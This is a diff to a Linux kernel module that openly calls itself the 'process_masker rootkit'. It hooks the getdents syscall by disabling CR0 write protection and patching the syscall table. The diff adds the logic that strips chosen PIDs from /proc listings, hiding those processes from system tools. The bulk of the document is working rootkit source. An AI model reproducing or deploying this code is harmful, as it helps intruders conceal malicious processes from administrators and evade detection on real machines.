@@ -21,18 +21,19 @@
 /*                                                                             */
 /*******************************************************************************/
 
-#include <linux/module.h>   /* Needed by all kernel modules */
-#include <linux/syscalls.h>   /* Needed for __NR_getdents */
-#include <linux/namei.h>   /* Needed for kern_path & LOOKUP_FOLLOW */
+#include <linux/module.h>		/* Needed by all kernel modules */
+#include <linux/syscalls.h>		/* Needed for __NR_getdents */
+#include <linux/namei.h>		/* Needed for kern_path & LOOKUP_FOLLOW */
+#include <linux/ctype.h>
 
 #include "process_masker.h"
-#include "sysmap.h"   /* Needed for ROOTKIT_SYS_CALL_TABLE */
+#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */
 
 MODULE_LICENSE("GPL");
 
 static int pids[PIDS_BUFFSIZE];
 static int pids_count = 0;
-module_param_array(pids, int, &pids_count, 0);   // TODO: edit the permission bits (last argument)
+module_param_array(pids, int, &pids_count, 0);
 
 
 unsigned long proc_ino;
@@ -44,10 +45,9 @@ asmlinkage int (*getdents_syscall)(unsigned int fd, struct linux_dirent *dirp, u
    insmoded into the kernel. It replaces the getdents() syscall. */
 static int __init process_masker_start(void)
 {
-	int i;
-
 	proc_ino = get_inode_no("/proc");
-    printk(KERN_INFO "process_masker rootkit: inode_no of dir `/proc` is %lu\n", proc_ino);
+	if (proc_ino < 0)
+		return 1;
 
 	disable_write_protect_mode();
 
@@ -56,16 +56,12 @@ static int __init process_masker_start(void)
 	getdents_syscall = (void *) sys_call_table[__NR_getdents];
 
 	/* Replace in the system call table the original
-	   getdents() syscall with our process masker function */
+	   getdents syscall with our manipulated getdents */
 	sys_call_table[__NR_getdents] = (unsigned long *) my_getdents_syscall;
 
 	enable_write_protect_mode();
 
 	printk(KERN_INFO "process_masker rootkit: %s\n", "successfully inserted");
-
-	printk(KERN_INFO "process_masker rootkit: pids_count = %d\n", pids_count);
-	for (i=0 ; i<PIDS_BUFFSIZE ; i++)
-		printk(KERN_INFO "process_masker rootkit: pids[%d]= %d\n", i, pids[i]);
 
 	/* A non 0 return value means init_module failed; module can't be loaded */
 	return 0;
@@ -87,12 +83,14 @@ static void __exit process_masker_end(void)
 }
 
 
-/* Function that replaces the original getdents_syscall. In addition to what
-   getdents_syscall does, it also  */
+/* Function that replaces the original getdents syscall. In addition to what
+   getdents does, additionally it ...  */
 asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
 	int nread;
-	int nread_copy;
+	int nread_temp;
+	int pid;
+	char *endptr;
 
 	/* Call original getdents_syscall */
 	nread = getdents_syscall(fd, dirp, count);
@@ -100,14 +98,22 @@ asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, u
 	if (dirp->d_ino != proc_ino)
 		return nread;
 
-	printk(KERN_INFO "process_masker rootkit: reading dir `/proc`");
+	nread_temp = nread;
 
-	nread_copy = nread;
+	while (nread_temp > 0) {
+		nread_temp -= dirp->d_reclen;
 
-	while (nread_copy > 0) {
-		nread_copy -= dirp->d_reclen;
+		pid = simple_strtol(dirp->d_name, &endptr, 10);
+		if (pid && should_mask(pid)) {
+			printk(KERN_INFO "process_masker rootkit: hiding PID %d\n", pid);
+			memmove(dirp, (char *) dirp + dirp->d_reclen, nread_temp);
+			nread -= dirp->d_reclen;
+			continue;
+		}
 
-		//printk(KERN_INFO "Filename: %s\n", dirp->d_name);
+		if (nread_temp == 0)
+			return nread;
+
 		dirp = (struct linux_dirent *) ((char *) dirp + dirp->d_reclen);
 	}
 
@@ -115,7 +121,7 @@ asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, u
 }
 
 
-/* Function that gets the inode number of the file found under `path` */
+/* Function that gets the inode number of the file found under specified path */
 unsigned long get_inode_no(char *path_name)
 {
 	unsigned long inode_no;
@@ -144,7 +150,6 @@ void disable_write_protect_mode(void)
 }
 
 
-// TODO: what if write protection was disabled in the first place?
 void enable_write_protect_mode(void)
 {
 	/* Reading contents of control register cr0. The cr0 register has various
@@ -154,6 +159,19 @@ void enable_write_protect_mode(void)
 	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
 	   bit to 1. When set to 1, the CPU can't write to read-only pages */
 	write_cr0(original_cr0 | 0x00010000);
+}
+
+
+/* Function that checks whether we need to mask the specified pid */
+int should_mask(pid_t pid)
+{
+	int i;
+
+	for (i=0 ; i<pids_count ; i++)
+		if (pids[i] == pid)
+			return 1;
+
+	return 0;
 }
 
 
